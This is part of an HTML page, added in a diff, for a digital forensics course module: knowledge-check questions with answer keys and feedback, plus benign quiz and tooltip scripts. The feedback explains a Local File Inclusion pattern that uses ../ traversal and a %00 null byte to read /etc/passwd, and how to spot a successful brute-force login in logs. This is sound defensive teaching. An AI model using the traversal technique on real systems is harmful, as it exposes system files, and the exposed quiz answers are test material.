+    <strong>✗ Not quite.</strong> The correct answer is <strong>(c) Local File Inclusion with null byte injection</strong>. The <code>file=</code> parameter with <code>../</code> sequences is a classic LFI pattern targeting <code>/etc/passwd</code>. The <code>%00</code> is a URL-encoded null byte (not a SQL comment or XSS technique). It truncates any file extension the application would append (e.g., if the code does <code>include($input . ".php")</code>, the null byte prevents <code>.php</code> from being appended). This technique works on older PHP versions (pre-5.3.4).
+  </div>
+</div>
+
+<!-- Question 3 -->
+<div class="kc-question" id="kc-q3">
+  <p class="q-stem">3. While analyzing a brute-force attack against <code>/admin/login</code>, an examiner observes 200 consecutive POST requests returning status 401 with response size 523 bytes, followed by a single POST returning status 302 with response size 0 bytes. What is the most likely interpretation of the 302 response?</p>
+  <ul class="kc-options" role="radiogroup" aria-label="Question 3 options">
+    <li><label><input type="radio" name="q3" value="a"> a) The server crashed and returned an error redirect</label></li>
+    <li><label><input type="radio" name="q3" value="b"> b) The attacker's IP was blocked by a firewall rule</label></li>
+    <li><label><input type="radio" name="q3" value="c"> c) The attacker successfully authenticated and was redirected to a post-login page</label></li>
+    <li><label><input type="radio" name="q3" value="d"> d) The 302 is a normal part of the login failure sequence and does not indicate success</label></li>
+  </ul>
+  <button class="kc-submit" data-question="q3" data-correct="c">Check Answer</button>
+  <div class="kc-feedback correct" id="q3-correct" role="alert">
+    <strong>✓ Correct!</strong> In a brute-force sequence, a change in the response pattern is the critical signal. The shift from 401 (authentication failed) to 302 (redirect) with a different response size strongly indicates that the attacker submitted valid credentials and was redirected to a post-login page (such as a dashboard). The 0-byte body is normal for a redirect response — the content is at the redirect target. The examiner should immediately investigate what the attacker accessed after this point.
+  </div>
+  <div class="kc-feedback incorrect" id="q3-incorrect" role="alert">
+    <strong>✗ Not quite.</strong> The correct answer is <strong>(c) The attacker successfully authenticated and was redirected to a post-login page</strong>. The key forensic principle here is <em>pattern deviation</em>: 200 identical 401 responses followed by a single 302 represents a clear break in the pattern. A 302 (Found/Redirect) after a POST to a login endpoint is the standard behavior for a successful login — the application redirects the authenticated user to their dashboard. If the IP were blocked, you would expect a 403 (Forbidden) or connection reset, not a 302 redirect.
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════ FOOTER ════════════════════════ -->
+<footer style="margin-top:40px;padding-top:16px;border-top:2px solid var(--border);text-align:center;color:var(--text-light);font-size:.85rem;">
+  <p>CSC 156 – Digital Forensics Fundamentals &nbsp;|&nbsp; Module 12.3 &nbsp;|&nbsp; Week 12</p>
+  <p>Continue to <strong>Module 12.4 – Correlating Network and Web Evidence</strong> to practice integrating the skills from Modules 12.1–12.3.</p>
+</footer>
+
+</div><!-- /page-wrap -->
+
+<!-- ════════════════════════ JAVASCRIPT ════════════════════════ -->
+<script>
+(function(){
+  "use strict";
+
+  /* ── Interactive log field tooltips ── */
+  var fields = document.querySelectorAll('.log-interactive .field');
+  var activeTip = null;
+
+  function closeTip(){
+    if(activeTip){
+      activeTip.classList.remove('show');
+      var parent = activeTip.parentElement || activeTip.closest('.field');
+      /* find the field that owns this tip */
+      fields.forEach(function(f){
+        if(f.getAttribute('data-tip') === activeTip.id){
+          f.setAttribute('aria-expanded','false');
+        }
+      });
+      activeTip = null;
+    }
+  }
+
+  function openTip(field){
+    closeTip();
+    var tipId = field.getAttribute('data-tip');
+    var tip = document.getElementById(tipId);
+    if(!tip) return;
+    tip.classList.add('show');
+    field.setAttribute('aria-expanded','true');
+    activeTip = tip;
+  }
+
+  fields.forEach(function(f){
+    f.addEventListener('click', function(e){
+      e.stopPropagation();
+      var tipId = f.getAttribute('data-tip');
+      var tip = document.getElementById(tipId);
+      if(activeTip === tip){ closeTip(); }
+      else { openTip(f); }
+    });
+    f.addEventListener('keydown', function(e){
+      if(e.key === 'Enter' || e.key === ' '){
+        e.preventDefault();
+        f.click();
+      } else if(e.key === 'Escape'){
+        closeTip();
+      }
+    });
+  });
+
+  document.addEventListener('click', function(){ closeTip(); });
+
+  /* ── Accordion ── */
+  var accBtns = document.querySelectorAll('.acc-btn');
+  accBtns.forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var expanded = btn.getAttribute('aria-expanded') === 'true';
+      var panel = document.getElementById(btn.getAttribute('aria-controls'));
+      if(expanded){
+        btn.setAttribute('aria-expanded','false');
+        panel.style.maxHeight = null;
+      } else {
+        btn.setAttribute('aria-expanded','true');
+        panel.style.maxHeight = panel.scrollHeight + 'px';
+        /* re-calc after images/content load */
+        setTimeout(function(){ panel.style.maxHeight = panel.scrollHeight + 'px'; }, 100);
+      }
+    });
+  });
+
+  /* ── Reveal button ── */
+  var revealBtns = document.querySelectorAll('.reveal-btn');
+  revealBtns.forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var targetId = btn.getAttribute('aria-controls');
+      var target = document.getElementById(targetId);
+      var showing = target.classList.contains('show');
+      if(showing){
+        target.classList.remove('show');
+        btn.setAttribute('aria-expanded','false');
+        btn.textContent = 'Reveal Model Timeline & Analysis';
+      } else {
+        target.classList.add('show');
+        btn.setAttribute('aria-expanded','true');
+        btn.textContent = 'Hide Model Timeline & Analysis';
+        target.scrollIntoView({behavior:'smooth', block:'nearest'});
+      }
+    });
+  });
+
+  /* ── Knowledge Check ── */
+  var kcBtns = document.querySelectorAll('.kc-submit');
+  kcBtns.forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var qName = btn.getAttribute('data-question');
+      var correctVal = btn.getAttribute('data-correct');
+      var selected = document.querySelector('input[name="'+qName+'"]:checked');
+      var correctDiv = document.getElementById(qName+'-correct');
+      var incorrectDiv = document.getElementById(qName+'-incorrect');
+
+      /* hide both first */
+      correctDiv.style.display = 'none';
+      incorrectDiv.style.display = 'none';
+
+      if(!selected){
+        alert('Please select an answer before checking.');
+        return;
+      }
+
+      if(selected.value === correctVal){
+        correctDiv.style.display = 'block';
+        incorrectDiv.style.display = 'none';
+      } else {
+        incorrectDiv.style.display = 'block';
+        correctDiv.style.display = 'none';
+      }
+    });
+  });
+
+})();
+</script>
+</body>
+</html>
